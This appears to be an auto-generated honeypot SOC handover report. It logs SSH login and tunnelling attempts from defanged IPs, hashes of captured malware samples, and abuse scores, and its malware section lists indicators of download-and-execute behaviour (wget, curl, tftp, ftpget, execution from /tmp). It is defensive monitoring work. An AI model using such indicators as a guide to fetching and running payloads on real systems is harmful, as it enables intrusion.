| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:45:18` | `cowrie.session.connect` |
| `2026-07-22 22:45:18` | `cowrie.client.version` |
| `2026-07-22 22:45:18` | `cowrie.client.kex` |
| `2026-07-22 22:45:20` | `cowrie.login.success` |
| `2026-07-22 22:45:21` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.91[.]67` to AbuseIPDB if not already reported
- [ ] Block `39.164.91[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b11e7e21eaf

| Field | Detail |
|---|---|
| **Source IP** | `220.93.167[.]144` |
| **First Seen** | 2026-07-22 22:45 |
| **Last Seen** | 2026-07-22 22:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:45:33` | `cowrie.session.connect` |
| `2026-07-22 22:45:34` | `cowrie.client.version` |
| `2026-07-22 22:45:34` | `cowrie.client.kex` |
| `2026-07-22 22:45:36` | `cowrie.login.success` |
| `2026-07-22 22:45:37` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.93.167[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.93.167[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a80d80b5c35b

| Field | Detail |
|---|---|
| **Source IP** | `39.164.94[.]190` |
| **First Seen** | 2026-07-22 22:50 |
| **Last Seen** | 2026-07-22 22:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:50:55` | `cowrie.session.connect` |
| `2026-07-22 22:50:55` | `cowrie.client.version` |
| `2026-07-22 22:50:55` | `cowrie.client.kex` |
| `2026-07-22 22:50:58` | `cowrie.login.success` |
| `2026-07-22 22:50:58` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:51:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.94[.]190` to AbuseIPDB if not already reported
- [ ] Block `39.164.94[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5ead11767eb

| Field | Detail |
|---|---|
| **Source IP** | `85.105.255[.]56` |
| **First Seen** | 2026-07-22 22:54 |
| **Last Seen** | 2026-07-22 22:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:54:12` | `cowrie.session.connect` |
| `2026-07-22 22:54:12` | `cowrie.client.version` |
| `2026-07-22 22:54:12` | `cowrie.client.kex` |
| `2026-07-22 22:54:13` | `cowrie.login.success` |
| `2026-07-22 22:54:14` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:54:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.255[.]56` to AbuseIPDB if not already reported
- [ ] Block `85.105.255[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `185.226.196[.]12` | **6** | 2026-07-22 21:05 | 2026-07-22 21:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-22 21:17 | 2026-07-22 22:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]187` | **3** | 2026-07-22 22:35 | 2026-07-22 22:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]96` | **3** | 2026-07-22 21:50 | 2026-07-22 21:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]171` | **3** | 2026-07-22 21:49 | 2026-07-22 21:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]102` | **3** | 2026-07-22 21:50 | 2026-07-22 21:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.226.196[.]15` | **2** | 2026-07-22 21:05 | 2026-07-22 21:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.169.105[.]9` | **2** | 2026-07-22 21:12 | 2026-07-22 21:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `60.171.24[.]134` | **2** | 2026-07-22 21:32 | 2026-07-22 21:34 | 2m | 0 | `T1592` | 🟢 LOW |
| `71.6.167[.]142` | **2** | 2026-07-22 21:54 | 2026-07-22 21:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `119.152.102[.]54` | 1 | 2026-07-22 21:08 | 2026-07-22 21:08 | 8s | 0 | `T1592` | 🟢 LOW |
| `121.202.198[.]98` | 1 | 2026-07-22 21:11 | 2026-07-22 21:11 | 1s | 0 | `T1592` | 🟢 LOW |
| `178.46.128[.]225` | 1 | 2026-07-22 21:17 | 2026-07-22 21:17 | 1s | 0 | `T1592` | 🟢 LOW |
| `182.101.233[.]160` | 1 | 2026-07-22 21:48 | 2026-07-22 21:49 | 13s | 0 | `T1592` | 🟢 LOW |
| `185.226.196[.]13` | 1 | 2026-07-22 21:06 | 2026-07-22 21:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.226.196[.]14` | 1 | 2026-07-22 21:06 | 2026-07-22 21:06 | 5s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-07-22 22:19 | 2026-07-22 22:19 | 31s | 0 | `T1592` | 🟢 LOW |
| `39.164.94[.]190` | 1 | 2026-07-22 22:45 | 2026-07-22 22:45 | 6s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-07-22 22:07 | 2026-07-22 22:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-22 21:18 | 2026-07-22 21:19 | 36s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]51` | 1 | 2026-07-22 20:58 | 2026-07-22 20:58 | 15s | 0 | `T1592` | 🟢 LOW |
| `81.236.211[.]54` | 1 | 2026-07-22 22:21 | 2026-07-22 22:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]156` | 1 | 2026-07-22 22:16 | 2026-07-22 22:16 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 55/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `49.124.150[.]248` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 48 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `65.20.138[.]46` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `211.178.165[.]251` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `101.13.5[.]26` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 50 |
| `218.70.9[.]114` | CN | CHINANET Chongqing  province network | **100** ⚠️ | 27 |
| `83.166.50[.]15` | EE | Telia Eesti AS | **100** ⚠️ | 50 |
| `85.105.255[.]56` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 50 |
| `136.185.6[.]181` | IN | Bharti Airtel Limited | **100** ⚠️ | 50 |
| `96.1.40[.]151` | CA | TELUS Mobility-Ontario | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 84 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 70 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 134 cases |
| Tool 34  | Credential Extractor        | ✅ 101 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 95 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (14.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 55 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 70 priority case(s) shown individually · 23 recon entry/entries in table (10 group(s) consolidating 31 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-22T23:10:26Z_
